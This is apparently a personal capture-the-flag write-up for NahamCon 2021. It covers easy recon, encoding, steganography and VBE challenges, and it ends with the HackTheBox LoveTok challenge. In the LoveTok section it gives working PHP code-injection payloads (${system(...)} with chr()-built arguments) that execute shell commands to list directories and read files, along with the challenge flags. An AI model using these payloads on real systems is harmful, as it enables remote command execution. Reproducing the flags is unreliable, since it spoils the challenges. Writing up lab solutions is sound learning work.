# NahamCon 2021 Write-ups
## Beginning tasks
These tasks are "hidden" in website HTML source code or in Discord channel description. They are easy to find.
- Read the rules
- #NahamCon2021
- UHC-BR
- Red Team Village
- Merch Store
- Live Recon Village
- IoT Village
- INE Career Corner
- HTB Village
- The Mission

## The Mission
### Bionic
We were given the website: https://constellations.page and the flag should be from the site.
No flag was found in the HTML or any .css, .js files. However, visiting https://constellations.page/robots.txt and the flag is just there:
```
flag{33b5240485dda77430d3de22996297a1}
```
also with a link to another page: `/meet-the-team.html`

### Meet The Team
There is already a hint to a comment in HTML source code
```html
<!-- Vela, can we please stop sharing our version control software out on the public internet? -->
```
I tried https://constellations.page/.git/ but that folder was locked (403). But I'm guessing the files are accessable. 
```

```

### something
At the bottom of the page, there are social media profile links. Navigating to the twitter link provided. The account has 1 tweet as the flag: https://twitter.com/C0NST3LLAT10NS/status/1370492033656365058
```
flag{e483bffafbb0db5eabc121846b455bc7}
```

## esab64
It's litterally base64 reverse string<br/>
The given string in file provided is
```
mxWYntnZiVjMxEjY0kDOhZWZ4cjYxIGZwQmY2ATMxEzNlFjNl13X
```
Reversing that we get
```
X31lNjFlNzExMTA2YmQwZGIxYjc4ZWZhODk0YjExMjViZntnYWxm
```
Do a base64 decode and we get a reversed flag
```
_}e61e711106bd0db1b78efa894b1125bf{galf
Poof: flag{fb5211b498afe87b1bd0db601117e16e}
```

## Shoelaces
A JPEG image of shoelaces was given. Running `strings` on the file output the flag in the middle.
```
flag{137288e960a3ae9b148e8a7db16a69b0}
```

## Veebee
We were given a .vbe script which is an encrypted .vbs. However it has junks added in the first 3 lines. Removing them and we will have a clean .vbe file.<br/>
Using this online tool https://master.ayra.ch/vbs/vbs.aspx to decrypt it to .vbs
```
flag{f805593d933f5433f2a04f082f400d8c}
```

## Pollex
A file `pollex` was given. Running `file` would show that this is a JPEG.<br/>
Running some tools like steghide binwalk wouldn't show anything.<br/>
It took me a while to realise the thumbnail has tiny text at the bottom (obviously the flag).<br/>
Using the command
```shell
exiftool -b -ThumbnailImage pollex.jpg > thumbnail.jpg
```
to extract the thumbnail image. Typing out the flag...? What? Hell no! Here: https://onlineocr.org/
```
flag{65c34a1ec121a286600ddd48fe36bc00}  // Okay there were mistakes by OCR ¯\_(ツ)_/¯
```

## HTB-LoveTok
We were given a link to hackthebox challenge. Running the instance of LoveTok and we got the link to a page with its source code.<br/>
On the page, a random string countdown time was given with a button to `<link>/?format=r`<br/>
There might be php file inclusion here.<br/>
Reading the source code, it seems like `format` param was used in `date()` function to represent the time in string. We cannot use `'`, `"` or `\` as they are escaped.<br/>
However we can use `${}` to include a php variable. `/format=${phpinfo()}` will show the phpinfo in the page, this confirms we can use `${}`. Now our goal is to get the file `flag` at the root of the container.

We can run `${system()}` to execute a shell command and cat the flag file, however we cannot use quotations -> spaces cannot be added, for example, `system(cat flag)` is not valid because `cat<space>flag` will be treated as PHP variables. There is a way to bypass this, using php `chr()` function and concatenate them.
Using this command, we can list the files in the root directory
```php
// ls ..
${system(ls.chr(0x20).chr(0x2e).chr(0x2e))}
/* Output
bin boot dev entrypoint.sh etc flagIJGrx home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var www
*/
```
You can see we have the file flagIJGrx. Now let's cat it out
```php
// cat ../flagIJGrx
${system(cat.chr(0x20).chr(0x27).chr(0x2e).chr(0x2e).chr(0x2F).flagIJGrx.chr(0x27))}
```
Voilà, the flag:
```
HTB{wh3n_l0v3_g3ts_eval3d_sh3lls_st4rt_p0pp1ng}
```